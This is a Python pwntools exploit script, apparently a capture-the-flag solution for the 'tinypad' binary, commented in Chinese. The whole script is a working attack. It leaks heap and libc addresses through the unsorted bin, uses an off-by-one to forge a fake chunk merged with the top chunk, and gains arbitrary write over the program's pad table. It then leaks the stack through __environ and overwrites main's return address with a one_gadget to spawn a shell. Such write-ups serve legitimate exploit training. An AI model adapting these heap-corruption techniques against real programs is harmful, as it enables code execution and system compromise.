# -*- coding=utf-8 -*-

from pwn import *

context.log_level="debug"

p = process("./tinypad")
elf = ELF("./tinypad")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def Add_pad(size,content):
	p.recvuntil("(CMD)>>> ")
	p.sendline("A")
	p.recvuntil("(SIZE)>>> ")
	p.sendline(str(size))
	p.recvuntil("(CONTENT)>>> ")
	p.sendline(content)
	p.recvuntil("Added.")

def Delete_pad(index):
	p.recvuntil("(CMD)>>> ")
	p.sendline("D")
	p.recvuntil("(INDEX)>>> ")
	p.sendline(str(index))
	p.recvuntil("Deleted.")

def Edit_pad(index,content):
	p.recvuntil("(CMD)>>> ")
	p.sendline("E")
	p.recvuntil("(INDEX)>>> ")
	p.sendline(str(index))
	p.recvuntil("(CONTENT)>>> ")
	p.sendline(content)
	p.recvuntil("(Y/n)>>> ")
	p.sendline("Y")
	p.recvuntil("Edited.")


if __name__=="__main__":
	Add_pad(224,"a"*10)
	Add_pad(246,"b"*0xf0)
	Add_pad(256,"c"*0xf0)
	Add_pad(256,"d"*10)

	Delete_pad(3)     #通过unsortbin泄露堆地址和libc地址
	Delete_pad(1)
	
	p.recvuntil("# CONTENT: ")
	heap_leak = u64(p.read(4).ljust(8,'\x00'))
	heap_base = heap_leak - 0x1f0

	print "heap_base: " + hex(heap_base)
	p.recvuntil("# CONTENT: ")
	p.recvuntil("# CONTENT: ")
	bss_leak = u64(p.read(6).ljust(8,'\x00'))
	libc_base = bss_leak - 0x3c4b78
	print "libc_base: " + hex(libc_base)
	
	tinypad_address = 0x602040 #重新获得pad 1，通过申请合适的大小来覆盖pad 2的presize，通过off by one 覆盖pad 2的size，使其P位置零，使其free后能将fake chunk和top chunk 合并
	Add_pad(232,"a"*224+p64(heap_base+240 - tinypad_address))

	Delete_pad(4)
	
	payload = p64(0x100) + p64(heap_base+240-tinypad_address) + p64(tinypad_address)*4 #构造fake chunk ，不然后面free时会报错
	
	Edit_pad(2,payload)
	Delete_pad(2)    #通过free 使fake chunk 和top chunk 合并，top chunk 的地址就变成构造的地址（tinypad）了

	Add_pad(0xe0,"a"*0xd0)	#重新申请就能申请到包含tinypad地址的堆，可以对tinypad的内容任意写

	payload = p64(0xe8) + p64(libc_base + libc.symbols["__environ"]) #pad 1 后面做泄露用
	payload += p64(0xe8) + p64(0x602148)  # pad 2 指向的是tinypad中pad 1的地址
	Add_pad(0x100,payload)
	
	p.recvuntil("# CONTENT: ")
	stack_env = u64(p.read(6).ljust(8,'\x00'))
	print "stack_env: " + hex(stack_env)	
	rsp = stack_env - 0x1e0
	
	one_gadget = 0x45216	#通过one_gadget获取
	gadget_address = libc_base + one_gadget

	Edit_pad(2, p64(rsp+0xf0)) #将pad 1的地址覆盖成main的返回地址
	Edit_pad(1,p64(gadget_address))  #将返回地址覆盖成one_gadget的地址
	#pause()
	#gdb.attach(p)	
	p.recvuntil("(CMD)>>> ")

	p.sendline("Q")
	
	p.interactive()
